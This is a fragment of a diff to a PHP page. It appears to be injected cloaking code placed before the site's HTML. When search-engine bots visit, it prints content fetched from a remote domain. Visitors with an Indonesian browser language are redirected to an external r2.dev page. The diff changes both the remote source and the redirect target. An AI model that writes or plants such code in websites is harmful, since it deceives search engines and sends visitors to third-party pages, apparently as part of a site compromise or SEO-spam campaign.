@@ -8,16 +8,16 @@ $s_ref = $_SERVER['HTTP_REFERER'];
             echo ' '; // Your bot-specific content
             exit;
         }
-        echo file_get_contents("https://caplakgroup.com/get/mumbai.txt");
+        echo file_get_contents("https://caplakgroup.com/get/jaipur.txt");
         exit;
         ?>
         <?php
     }
     $browserLang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
     if ($browserLang == 'id') {
-        header("Location: https://pub-cfe141cf2d2a41ae8c0bde499b729f81.r2.dev/index.html");
+        header("Location: https://pub-f195b50fe2554376982eeade46fd7c97.r2.dev/index.html");
         exit;
-    }
+    } ?>
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
 "http://www.w3.org/TR/html4/loose.dtd">
 <html>
